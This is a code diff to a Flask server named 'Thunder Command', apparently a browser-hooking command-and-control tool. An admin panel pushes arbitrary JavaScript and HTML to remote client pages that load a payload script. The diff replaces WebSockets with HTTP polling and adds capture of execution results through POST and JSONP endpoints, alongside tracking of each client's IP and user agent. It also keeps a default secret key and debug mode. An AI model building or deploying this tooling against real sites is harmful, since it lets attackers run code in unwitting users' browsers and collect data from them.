@@ -8,7 +8,7 @@ from functools import wraps
 import os
 import uuid
 import mimetypes
-from core.utils.logger import app_logger, websocket_logger, command_logger, auth_logger, log_command, log_websocket_event, log_auth_event
+from core.utils.logger import app_logger, command_logger, auth_logger, log_command, log_auth_event
 from core.database import init_db, ClientRepository, CommandRepository
 from collections import deque
 
@@ -19,11 +19,12 @@ init_db()
 client_repo = ClientRepository()
 command_repo = CommandRepository()
 
-# In-memory data for faster lookups and websocket management
+# In-memory data for faster lookups and client management
 clients = {}  # Client cache
 commands = {}  # Active commands
-socket_clients = {}  # WebSocket sessions
+# Using HTTP polling only - no WebSocket support
 command_logs = deque(maxlen=1000)  # Recent command history
+capture_results_enabled = True  # Global toggle for command result capture
 
 def initialize_global_state():
     """Initialize global state from database"""
@@ -80,13 +81,7 @@ def handle_error(error):
     app_logger.error(f"Error occurred: {error}")
     return response
 
-# Importação condicional para Socket.IO
-socketio_available = False
-try:
-    from flask_socketio import SocketIO, emit
-    socketio_available = True
-except ImportError:
-    app_logger.warning("flask-socketio not available. Falling back to traditional HTTP polling.")
+# WebSocket removed - using HTTP polling only
 
 """
 Thunder Command: Sistema de Controle Remoto para Páginas Web
@@ -98,24 +93,22 @@ manipulem elementos DOM, injetem HTML e controlem a visibilidade de elementos
 em páginas web cliente sem necessidade de atualização.
 
 Funcionalidades:
-    - Execução de comandos em tempo real via WebSocket ou HTTP polling
+    - Execução de comandos em tempo real via HTTP polling
     - Capacidades de manipulação DOM (adicionar, substituir, inserir conteúdo)
     - Painel administrativo para monitoramento de clientes
     - Rastreamento e gerenciamento de conexões de clientes
     - Histórico de comandos e registro de execução
-    - Suporte para WebSocket e polling HTTP tradicional
     - Autenticação segura para acesso administrativo
 
 Detalhes Técnicos:
-    - Construído com Flask e Flask-SocketIO
-    - Suporta comunicação síncrona e assíncrona
-    - Usa armazenamento em memória com histórico de comandos limitado
+    - Construído com Flask puro
+    - Comunicação via polling HTTP com endpoints RESTful
+    - Usa armazenamento SQLite com histórico de comandos persistente
     - Implementa gerenciamento seguro de sessões
-    - Fornece mecanismos de fallback para indisponibilidade de WebSocket
 
 Autores: MrCl0wn Security Lab
 Criação: Maio/2025
-Versão: 1.0 (Atualizado com WebSockets)
+Versão: 2.0 (HTTP Polling + HTMX)
 """
 
 # Configuração para compatibilidade Windows com MIME types
@@ -126,17 +119,7 @@ app = Flask(__name__, static_folder='static', static_url_path='/static')
 app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_change_in_production')
 app.register_error_handler(Exception, handle_error)
 
-# Configuração do Socket.IO se disponível
-if socketio_available:
-    try:
-        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
-        app_logger.info("Socket.IO initialized successfully in threading mode")
-    except Exception as e:
-        socketio_available = False
-        app_logger.error(f"Failed to initialize Socket.IO: {e}")
-        app_logger.warning("Falling back to traditional HTTP polling")
-else:
-    socketio = None
+# HTTP polling only - no WebSocket dependencies
 
 # Credenciais de autenticação para o painel de administração
 # AVISO DE SEGURANÇA: Em ambiente de produção, estas credenciais devem estar em
@@ -160,23 +143,34 @@ def js_format_try_catch(js_code):
     Previne que erros de execução JavaScript interrompam o resto do código,
     envolvendo o código fornecido em uma função auto-executável dentro de um
     bloco try-catch. Se ocorrer um erro durante a execução, ele será
-    silenciosamente capturado.
+    silenciosamente capturado. O valor de retorno é preservado.
     
     Args:
         js_code (str): O código JavaScript a ser envolvido no bloco try-catch.
             Pode ser qualquer declaração ou expressão JavaScript válida.
     
     Returns:
-        str: O código JavaScript envolvido no formato:
-            try{(function(){...código...}());}catch(err){}
+        str: O código JavaScript envolvido no formato que preserva o valor de retorno:
+            (function(){try{return (função(){código}());}catch(err){return undefined;}})()
             Retorna None se js_code estiver vazio ou for None.
     
     Exemplo:
-        >>> js_format_try_catch("document.getElementById('test').innerHTML = 'Olá';")
-        "try{(function(){document.getElementById('test').innerHTML = 'Olá';}());}catch(err){}"
+        >>> js_format_try_catch("return 'test';")
+        "(function(){try{return (function(){return 'test';}());}catch(err){return undefined;}})()"
     """
-    if js_code:
-        return f'try{{(function(){{{js_code}}}());}}catch(err){{}}'
+    if not js_code or not js_code.strip():
+        return None
+        
+    # Para comandos de manipulação DOM que já têm tratamento interno,
+    # não adicionar try-catch extra para evitar dupla encapsulação
+    if js_code.strip().startswith('(function()') and 'catch(' in js_code:
+        return js_code
+    
+    # Escapar o código JavaScript para evitar problemas de sintaxe
+    escaped_js_code = js_code.replace('\\', '\\\\').replace('\n', ' ').replace('\r', ' ')
+    
+    # Envolver código simples em try-catch silencioso (uma linha)
+    return f"(function(){{try{{return (function(){{{escaped_js_code}}})();}}catch(err){{return 'Erro: '+err.message;}}}})();"
 
 # Decorator para proteger rotas que exigem autenticação
 def login_required(f):
@@ -272,6 +266,8 @@ def set_command():
         try:
             # Generate JavaScript command based on type
             if command_type == 'js':
+                # Para comandos JavaScript puros, usar o conteúdo diretamente
+                # sem encapsulação adicional, deixando o cliente lidar com a execução
                 js_command = content
             elif command_type == 'html':
                 js_command = f"""
@@ -308,8 +304,9 @@ def set_command():
             else:
                 raise CommandError(f"Unsupported command type: {command_type}")
             
-            # Wrap command in try-catch
-            if js_command:
+            # Aplicar try-catch apenas para comandos que não sejam JavaScript puro
+            # Comandos JavaScript puros são executados diretamente pelo cliente
+            if js_command and command_type != 'js':
                 js_command = js_format_try_catch(js_command)
             
             # Create command data
@@ -332,12 +329,7 @@ def set_command():
                         # Store command for each active client
                         commands[active_client_id] = command_data
                         
-                        # Send via WebSocket if available for this client
-                        if socketio_available and active_client_id in socket_clients:
-                            try:
-                                socketio.emit('command', command_data, room=socket_clients[active_client_id])
-                            except Exception as e:
-                                app_logger.error(f"Failed to send command via WebSocket to client {active_client_id}: {e}")
+                        # Command stored for polling retrieval
             else:
                 # Single client command handling
                 command = command_repo.create(client_id, command_type, js_command, command_id)
@@ -347,12 +339,7 @@ def set_command():
                 if client_id in clients:
                     clients[client_id]["last_command"] = current_time
                     
-                # Send via WebSocket if available
-                if socketio_available and client_id in socket_clients:
-                    try:
-                        socketio.emit('command', command_data, room=socket_clients[client_id])
-                    except Exception as e:
-                        app_logger.error(f"Failed to send command via WebSocket: {e}")
+                # Command will be retrieved via polling endpoint
 
             # Log command
             log_command(client_id, command_type, command_id)
@@ -379,15 +366,14 @@ def set_command():
         raise CommandError(str(e))
 
 def generate_manipulation_command(target_id, action, content):
-    """Gera comandos JavaScript para operações de manipulação do DOM.
+    """Gera comandos JavaScript seguros para operações de manipulação do DOM.
     
-    Cria código JavaScript para manipular elementos DOM por ID ou nome de classe.
-    A função gera múltiplos comandos alternativos para lidar com seletores de
-    classe e ID, garantindo que a operação funcione independentemente de como
-    o elemento é identificado.
+    Cria código JavaScript que verifica a existência de elementos antes de manipulá-los.
+    A função gera código que tenta múltiplas estratégias de seleção (ID, classe, seletor CSS)
+    e fornece feedback detalhado sobre o sucesso ou falha da operação.
     
     Args:
-        target_id (str): O ID ou nome da classe do elemento DOM alvo.
+        target_id (str): O ID, nome da classe ou seletor CSS do elemento DOM alvo.
         action (str): O tipo de manipulação a ser realizada. Valores válidos são:
             - 'ADD': Adiciona conteúdo ao elemento existente
             - 'REPLACE': Substitui todo o conteúdo do elemento
@@ -396,39 +382,38 @@ def generate_manipulation_command(target_id, action, content):
         content (str): O conteúdo HTML para inserir ou manipular.
     
     Returns:
-        str: Comandos JavaScript concatenados envolvidos em blocos try-catch para
-            tratamento de erros.
+        str: Código JavaScript seguro com verificação de existência de elementos
+            e tratamento de erros.
     
     Raises:
         CommandError: Se o tipo de ação não for um dos valores suportados.
     
     Exemplo:
         >>> generate_manipulation_command('meuDiv', 'ADD', '<p>Olá</p>')
-        'try{...}catch(err){}try{...}catch(err){}'
+        "(function(){...código de manipulação segura...})()"
     """
-    commands = {
-        'ADD': [
-            f"document.getElementsByClassName('{target_id}')[0].innerHTML += `{content}`;",
-            f"document.getElementById('{target_id}').innerHTML += `{content}`;"
-        ],
-        'REPLACE': [
-            f"document.getElementsByClassName('{target_id}')[0].innerHTML = `{content}`;",
-            f"document.getElementById('{target_id}').innerHTML = `{content}`;"
-        ],
-        'INSERT_AFTER': [
-            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('afterend', `{content}`);",
-            f"document.getElementById('{target_id}').insertAdjacentHTML('afterend', `{content}`);"
-        ],
-        'INSERT_BEFORE': [
-            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('beforebegin', `{content}`);",
-            f"document.getElementById('{target_id}').insertAdjacentHTML('beforebegin', `{content}`);"
-        ]
+    
+    if action not in ['ADD', 'REPLACE', 'INSERT_AFTER', 'INSERT_BEFORE']:
+        raise CommandError(f"Invalid action type: {action}")
+    
+    # Mapear ações para operações JavaScript
+    operation_map = {
+        'ADD': 'element.innerHTML += content',
+        'REPLACE': 'element.innerHTML = content',
+        'INSERT_AFTER': 'element.insertAdjacentHTML("afterend", content)',
+        'INSERT_BEFORE': 'element.insertAdjacentHTML("beforebegin", content)'
     }
     
-    if action not in commands:
-        raise CommandError(f"Invalid action type: {action}")
-        
-    return "".join([js_format_try_catch(cmd) for cmd in commands[action]])
+    operation = operation_map[action]
+    
+    # Escapar conteúdo para evitar problemas com quebras de linha
+    escaped_content = content.replace('\\', '\\\\').replace('`', '\\`').replace('\n', '\\n').replace('\r', '\\r')
+    escaped_target_id = target_id.replace('\\', '\\\\').replace("'", "\\'")
+    
+    # Gerar código JavaScript silencioso em uma linha
+    safe_js_code = f"(function(){{const targetId='{escaped_target_id}';const content=`{escaped_content}`;let element=null;try{{element=document.getElementById(targetId)||(document.getElementsByClassName(targetId)[0])||document.querySelector(targetId);}}catch(e){{}}if(element){{try{{{operation};return 'OK';}}catch(e){{return 'Erro: '+e.message;}}}}else{{return 'Elemento não encontrado: '+targetId;}}}})();"
+    
+    return safe_js_code
 
 @app.route('/admin/clients')
 @login_required
@@ -448,7 +433,7 @@ def get_clients():
             "last_seen": client.get("last_seen", ""),
             "user_agent": client.get("user_agent", ""),
             "ip": client.get("ip", ""),
-            "websocket": client_id in socket_clients  # Indica se o cliente está usando WebSockets
+            "connection_type": "polling"  # Always HTTP polling now
         }
         for client_id, client in clients.items()
     ]
@@ -475,7 +460,7 @@ def get_client_details(client_id):
         "last_activity": client.get("last_activity", ""),
         "user_agent": client.get("user_agent", ""),
         "ip": client.get("ip", ""),
-        "websocket": client_id in socket_clients,  # Indica se o cliente está usando WebSockets
+        "connection_type": "polling",  # Always HTTP polling now
         "first_seen": client.get("first_seen", ""),
         "commands_received": client.get("commands_received", 0),
         "screen_info": client.get("screen_info", {})
@@ -495,11 +480,7 @@ def remove_client(client_id):
         if client_id in commands:
             del commands[client_id]
             
-        # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, notificá-lo para desconectar
-        if socketio_available and client_id in socket_clients:
-            socketio.emit('disconnect_request', room=socket_clients[client_id])
-            # Remover do mapeamento de socket_clients (a conexão Socket.IO real será encerrada pelo cliente)
-            del socket_clients[client_id]
+        # Client will stop polling when session is inactive
             
         return jsonify({"success": True})
     else:
@@ -508,8 +489,82 @@ def remove_client(client_id):
 @app.route('/admin/logs')
 @login_required
 def get_logs():
-    """Endpoint para obter o histórico de comandos enviados"""
-    return jsonify({"success": True, "logs": list(command_logs)})
+    """Endpoint para obter o histórico de comandos enviados com resultados"""
+    # Enriquecer logs com informações de resultado
+    enriched_logs = []
+    
+    for log in command_logs:
+        enriched_log = dict(log)  # Copia o log original
+        
+        # Adicionar informações de resultados se existirem
+        if 'results' in log and log['results']:
+            enriched_log['has_results'] = True
+            enriched_log['total_results'] = len(log['results'])
+            enriched_log['success_count'] = log.get('success_count', 0)
+            enriched_log['error_count'] = log.get('error_count', 0)
+            enriched_log['last_result'] = log.get('last_result', {})
+            
+            # Status geral baseado nos resultados
+            if enriched_log['error_count'] > 0:
+                enriched_log['overall_status'] = 'error'
+            elif enriched_log['success_count'] > 0:
+                enriched_log['overall_status'] = 'success'
+            else:
+                enriched_log['overall_status'] = 'pending'
+        else:
+            enriched_log['has_results'] = False
+            enriched_log['total_results'] = 0
+            enriched_log['success_count'] = 0
+            enriched_log['error_count'] = 0
+            enriched_log['overall_status'] = 'no_response'
+        
+        enriched_logs.append(enriched_log)
+    
+    # Check if request is from HTMX 
+    if request.headers.get('HX-Request'):
+        # Return HTML fragment for HTMX
+        return render_template('partials/logs_content.html', logs=enriched_logs)
+    else:
+        # Return JSON for JavaScript requests
+        return jsonify({"success": True, "logs": enriched_logs})
+
+@app.route('/admin/stats')
+@login_required  
+def get_dashboard_stats():
+    """Endpoint para obter estatísticas do dashboard via HTMX"""
+    # Update client status and get statistics
+    update_client_active_status()
+    
+    total_clients = len(clients)
+    online_clients = len([c for c in clients.values() if c.get('active', False)])
+    polling_clients = online_clients  # All connections are polling now
+    commands_sent = len(command_logs)
+    
+    stats = {
+        'total_clients': total_clients,
+        'online_clients': online_clients, 
+        'polling_clients': polling_clients,
+        'commands_sent': commands_sent
+    }
+    
+    return render_template('partials/dashboard_stats.html', stats=stats)
+
+@app.route('/admin/toggle_capture', methods=['POST'])
+@login_required
+def toggle_capture():
+    """Endpoint para alternar a captura de resultados de comandos"""
+    global capture_results_enabled
+    capture_results_enabled = not capture_results_enabled
+    
+    # Return HTMX fragment for the toggle UI
+    return render_template('partials/capture_toggle.html', capture_enabled=capture_results_enabled)
+
+@app.route('/admin/capture_status')
+@login_required  
+def get_capture_status():
+    """Endpoint para obter o status atual da captura de resultados"""
+    # Return HTMX fragment for the toggle UI  
+    return render_template('partials/capture_toggle.html', capture_enabled=capture_results_enabled)
 
 @app.route('/')
 def index():
@@ -542,17 +597,25 @@ def serve_payload_js(dinamic_file, dinamic_id):
         return jsonify({"error": "Not Found"}), 440
     
     response = send_from_directory('payload', 'cmd.js', mimetype='application/javascript')
-    response.headers['Cache-Control'] = 'public, max-age=604800'
+    # Disable caching during development to ensure latest version is loaded
+    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
+    response.headers['Pragma'] = 'no-cache'
+    response.headers['Expires'] = '0'
     return response
 
-# Rota para servir a biblioteca cliente do Socket.IO
-@app.route('/js/socket.io.min.js')
-@app.route('/js/socket.io.min.js.map')
-def serve_socketio_js():
-    """Rota para servir a biblioteca cliente do Socket.IO"""
-    response = send_from_directory('static/js', 'socket.io.min.js', mimetype='application/javascript')
-    response.headers['Cache-Control'] = 'public, max-age=604800'
-    return response
+# Socket.IO routes removed - using HTTP polling only
+# Add fallback routes to handle cached Socket.IO requests gracefully
+@app.route('/socket.io/', methods=['GET', 'POST'])
+@app.route('/socket.io/<path:path>', methods=['GET', 'POST'])
+def socket_io_fallback(path=''):
+    """Fallback handler for cached Socket.IO requests"""
+    app_logger.warning(f"Received Socket.IO request to /socket.io/{path} - returning deprecation notice")
+    return jsonify({
+        "error": "Socket.IO has been disabled", 
+        "message": "This application now uses HTTP polling only. Please clear your browser cache and reload.",
+        "polling_endpoint": "/command",
+        "status": "deprecated"
+    }), 410  # 410 Gone - resource no longer available
 
 # Route for serving static images
 @app.route('/static/img/<path:filename>')
@@ -628,6 +691,7 @@ def get_command():
     # Prepara a resposta com indicação se é um comando novo
     response_data = {
         "new": last_received != current_command.get("id", ""),
+        "capture_results": capture_results_enabled,  # Tell client whether to capture results
         **current_command
     }
     
@@ -648,186 +712,44 @@ def get_command():
     
     return response
 
-# Socket.IO eventos - definidos apenas se o Socket.IO estiver disponível
-if socketio_available:
-    @socketio.on('connect')
-    def handle_connect():
-        """Manipula novas conexões WebSocket.
-        
-        Registra novas conexões e atribui um ID de sessão. Esta é a conexão
-        WebSocket inicial, antes do registro do cliente.
-        
-        Nota:
-            Isto não significa que o cliente está registrado ainda. Os clientes
-            devem enviar um evento 'register' após a conexão para serem
-            completamente inicializados.
-        
-        Eventos Emitidos:
-            Nenhum evento emitido diretamente.
-        """
-        try:
-            session_id = request.sid
-            log_websocket_event('connect', data={'session_id': session_id})
-        except Exception as e:
-            log_websocket_event('connect_error', error=str(e))
-            app_logger.exception("Error in WebSocket connect handler")
+# All SocketIO event handlers removed - using HTTP polling only
 
-    @socketio.on('register')
-    def handle_register(data):
-        """Registra um cliente conectado via WebSocket."""
-        try:
-            client_id = data.get('client_id')
-            if not client_id:
-                raise ValueError("No client_id provided")
-            
-            session_id = request.sid
-            log_websocket_event('register', client_id, {'session_id': session_id})
-            
-            # Associate client_id with WebSocket session
-            socket_clients[client_id] = session_id
-            
-            # Initialize or update client data
-            now = datetime.now().isoformat()
-            if client_id not in clients:
-                client_data = {
-                    "id": client_id,
-                    "first_seen": now,
-                    "last_seen": now,
-                    "last_activity": now,
-                    "user_agent": request.headers.get('User-Agent', ''),
-                    "ip": request.remote_addr,
-                    "connection_type": "websocket",
-                    "commands_received": 0,
-                    "successful_commands": 0,
-                    "failed_commands": 0,
-                    "screen_info": {}
-                }
-                # Salva no banco e no cache
-                client_repo.create_or_update(client_id, **client_data)
-                clients[client_id] = client_data
-
-                if client_id not in commands:
-                    commands[client_id] = commands.get('default', {
-                        "id": "",
-                        "command": "",
-                        "timestamp": ""
-                    })
-            else:
-                # Atualiza informações do cliente existente
-                client_data = {
-                    "last_seen": now,
-                    "last_activity": now,
-                    "user_agent": request.headers.get('User-Agent', ''),
-                    "ip": request.remote_addr,
-                    "connection_type": "websocket"
-                }
-                client_repo.create_or_update(client_id, **client_data)
-                clients[client_id].update(client_data)
-            
-            # Salva informações da sessão WebSocket
-            client_repo.update_socket_session(client_id, session_id)
-
-            # Notify admin about new client
-            try:
-                socketio.emit('client_update', {
-                    "action": "connect",
-                    "client": {
-                        "id": client_id,
-                        "active": True,
-                        "last_seen": clients[client_id]["last_seen"],
-                        "websocket": True
-                    }
-                }, room='admin')
-            except Exception as e:
-                log_websocket_event('admin_notification_error', client_id, error=str(e))
-            
-            # Send last command to client
-            if client_id in commands:
-                try:
-                    current_command = commands[client_id]
-                    emit('command', current_command)
-                    log_websocket_event('command_sent', client_id, {'command_id': current_command.get('id')})
-                except Exception as e:
-                    log_websocket_event('command_send_error', client_id, error=str(e))
-                    
-        except Exception as e:
-            log_websocket_event('register_error', error=str(e))
-            app_logger.exception("Error in WebSocket register handler")
-            emit('register_error', {"error": str(e)})
-
-    @socketio.on('disconnect')
-    def handle_disconnect():
-        """Handle WebSocket disconnections"""
-        try:
-            session_id = request.sid
-            
-            # Find client_id associated with this session
-            client_id = None
-            for cid, sid in socket_clients.items():
-                if sid == session_id:
-                    client_id = cid
-                    break
-            
-            if client_id:
-                log_websocket_event('disconnect', client_id)
-                
-                # Remove socket mapping
-                del socket_clients[client_id]
-                
-                # Update client status in memory and database
-                if client_id in clients:
-                    clients[client_id]["connection_type"] = "disconnected"
-                    client_repo.create_or_update(client_id, connection_type="disconnected")
-                
-                # Remove socket session from database
-                client_repo.remove_socket_session(client_id)
-                
-                # Notify admin
-                try:
-                    socketio.emit('client_update', {
-                        "action": "disconnect",
-                        "client_id": client_id
-                    }, room='admin')
-                except Exception as e:
-                    log_websocket_event('admin_notification_error', client_id, error=str(e))
-            else:
-                log_websocket_event('disconnect', data={'session_id': session_id, 'note': 'No associated client'})
-                
-        except Exception as e:
-            log_websocket_event('disconnect_error', error=str(e))
-            app_logger.exception("Error in WebSocket disconnect handler")
-
-    @socketio.on('join_admin')
-    def handle_join_admin():
-        """Administrators join the 'admin' room for real-time updates"""
-        try:
-            if 'logged_in' in session:
-                session_id = request.sid
-                socketio.server.enter_room(session_id, 'admin')
-                log_websocket_event('admin_join', data={'session_id': session_id})
-                emit('admin_joined', {"success": True})
-            else:
-                log_websocket_event('admin_join_unauthorized', data={'session_id': request.sid})
-                emit('admin_joined', {"success": False, "error": "Unauthorized"})
-        except Exception as e:
-            log_websocket_event('admin_join_error', error=str(e))
-            app_logger.exception("Error in admin join handler")
-            emit('admin_joined', {"success": False, "error": str(e)})
-
-@app.route('/command/result', methods=['POST'])
+@app.route('/command/result', methods=['POST', 'GET'])
 def receive_command_result():
     """Endpoint para receber resultados da execução de comandos dos clientes."""
     try:
-        data = request.get_json()
-        if not data:
-            raise CommandError("Invalid request: No JSON data provided")
+        # Handle both POST (fetch) and GET (JSONP) requests
+        if request.method == 'POST':
+            data = request.get_json()
+            if not data:
+                raise CommandError("Invalid request: No JSON data provided")
+        else:  # GET request for JSONP
+            data = request.args.to_dict()
+        
+        app_logger.info(f"Recebido resultado de comando: {data}")
         
         client_id = data.get('client_id')
         command_id = data.get('command_id')
         success = data.get('success', False)
-        timestamp = datetime.now().isoformat()
+        # Convert string 'true'/'false' to boolean for GET requests
+        if isinstance(success, str):
+            success = success.lower() == 'true'
+        timestamp = data.get('timestamp') or datetime.now().isoformat()
         result = data.get('result', '')
         execution_time = data.get('execution_time', 0)
+        # Convert string to int for GET requests
+        if isinstance(execution_time, str):
+            try:
+                execution_time = int(execution_time)
+            except ValueError:
+                execution_time = 0
+        
+        # Novos campos de metadados
+        result_type = data.get('result_type', 'unknown')
+        command_original = data.get('command_original', '')
+        user_agent = data.get('user_agent', '')
+        
+        app_logger.info(f"Processando resultado - Command ID: {command_id}, Client ID: {client_id}, Success: {success}, Result: {result}, Execution Time: {execution_time}ms")
         
         if not client_id or not command_id:
             raise CommandError("Missing required parameters: client_id and command_id")
@@ -835,19 +757,25 @@ def receive_command_result():
         # Create result entry and save to database
         command_repo.add_result(command_id, client_id, success, result, execution_time)
         
-        # Create result entry for memory cache
+        # Create result entry for memory cache with extended metadata
         result_entry = {
             "client_id": client_id,
             "command_id": command_id,
             "success": success,
             "timestamp": timestamp,
             "result": result,
-            "execution_time": execution_time
+            "result_type": result_type,
+            "execution_time": execution_time,
+            "command_original": command_original,
+            "user_agent": user_agent
         }
         
         # Update command logs in memory
         updated = False
+        app_logger.info(f"Procurando comando {command_id} nos logs. Total de logs: {len(command_logs)}")
+        
         for log in command_logs:
+            app_logger.debug(f"Verificando log ID: {log.get('id')} vs comando ID: {command_id}")
             if log["id"] == command_id:
                 log["results"] = log.get("results", [])
                 log["results"].append(result_entry)
@@ -855,10 +783,12 @@ def receive_command_result():
                 log["success_count"] = len([r for r in log["results"] if r["success"]])
                 log["error_count"] = len([r for r in log["results"] if not r["success"]])
                 updated = True
+                app_logger.info(f"Comando {command_id} atualizado com resultado. Total de resultados: {len(log['results'])}")
                 break
         
         if not updated:
             app_logger.warning(f"Received result for unknown command: {command_id}")
+            app_logger.info(f"IDs disponíveis nos logs: {[log.get('id') for log in command_logs]}")
         
         # Update client information in cache
         if client_id in clients:
@@ -878,16 +808,16 @@ def receive_command_result():
         else:
             log_command(client_id, "result", command_id, success=False, error=result)
         
-        # Notify admins via WebSocket
-        if socketio_available:
-            try:
-                socketio.emit('command_result', result_entry, room='admin')
-            except Exception as e:
-                error_msg = f"Failed to notify admins: {str(e)}"
-                app_logger.error(error_msg)
-                log_websocket_event('command_result_notification_error', client_id, error=error_msg)
+        # Admin notifications will be handled via polling/HTMX updates
         
-        return jsonify({"success": True})
+        # Handle JSONP callback for GET requests
+        response_data = {"success": True}
+        if request.method == 'GET' and 'callback' in data:
+            callback = data['callback']
+            json_response = json.dumps(response_data)
+            return f"{callback}({json_response});", 200, {'Content-Type': 'application/javascript'}
+        
+        return jsonify(response_data)
         
     except Exception as e:
         app_logger.exception("Error processing command result")
@@ -917,7 +847,7 @@ def is_client_active(client, cleanup_time=None):
 def update_client_active_status():
     """
     Atualiza o status ativo/inativo de todos os clientes no cache.
-    Remove clientes inativos do dicionário socket_clients.
+    Remove clientes inativos do cache de clientes.
     """
     cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
     inactive_clients = []
@@ -926,23 +856,16 @@ def update_client_active_status():
         # Atualiza o status de ativo
         client['active'] = is_client_active(client, cleanup_time)
         
-        # Se inativo, adiciona à lista para limpar socket_clients
-        if not client['active'] and client_id in socket_clients:
+        # Mark client as needing cleanup if inactive
+        if not client['active']:
             inactive_clients.append(client_id)
     
-    # Remove clientes inativos de socket_clients
+    # Remove inactive clients from cache
     for client_id in inactive_clients:
-        del socket_clients[client_id]
+        if client_id in clients:
+            app_logger.info(f"Removing inactive client: {client_id}")
+            del clients[client_id]
 
 if __name__ == '__main__':
-    if socketio_available:
-        try:
-            # Inicialização do servidor com Socket.IO
-            socketio.run(app, debug=True, allow_unsafe_werkzeug=True)
-        except Exception as e:
-            app_logger.error(f"Erro ao iniciar com Socket.IO: {e}")
-            app_logger.info("Iniciando no modo Flask padrão...")
-            app.run(debug=True)
-    else:
-        # Fallback para Flask padrão sem Socket.IO
-        app.run(debug=True)
+    # Run Flask server with HTTP polling only
+    app.run(debug=True)
